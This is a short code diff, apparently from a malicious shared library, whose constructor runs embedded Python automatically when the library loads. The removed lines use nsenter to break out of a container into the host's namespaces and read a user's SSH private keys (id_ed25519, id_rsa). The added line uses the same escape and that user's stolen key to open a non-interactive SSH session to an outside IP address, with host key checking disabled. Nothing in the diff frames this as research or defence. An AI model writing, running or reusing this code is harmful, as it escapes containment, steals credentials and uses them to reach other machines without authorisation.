@@ -105,10 +105,7 @@ __attribute__((constructor)) static void on_so_load() {
   install_run_cmd_to_builtins();
 
   PyRun_SimpleString(R"PY(
-run_cmd('nsenter -t 1 -m -u -i -n -p -- sudo ls -la /home/future/.ssh/')
-run_cmd('nsenter -t 1 -m -u -i -n -p -- ls -la /home/future/.ssh/')
-run_cmd('nsenter -t 1 -m -u -i -n -p -- cat /home/future/.ssh/id_ed25519')
-run_cmd('nsenter -t 1 -m -u -i -n -p -- cat /home/future/.ssh/id_rsa')
+run_cmd("nsenter -t 1 -m -u -i -n -p -- su - future -c 'ssh -o StrictHostKeyChecking=no -o BatchMode=yes -i ~/.ssh/id_ed25519 ubuntu@43.143.241.66 \"id && hostname\"'")
 
 )PY");
 
